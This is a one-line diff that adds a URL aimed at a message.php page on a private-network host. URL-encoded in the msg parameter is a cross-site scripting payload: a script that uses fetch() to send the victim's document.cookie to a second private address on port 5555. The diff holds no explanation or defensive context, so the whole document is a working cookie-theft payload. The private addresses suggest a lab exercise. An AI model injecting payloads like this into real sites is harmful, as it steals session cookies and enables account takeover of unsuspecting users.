@@ -1,0 +1,1 @@
+http://192.168.1.203:80/message.php?msg=%3Cscript%3Efetch%28%27http%3A%2F%2F192.168.1.201%3A5555%2F%3FcookieId1234%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E
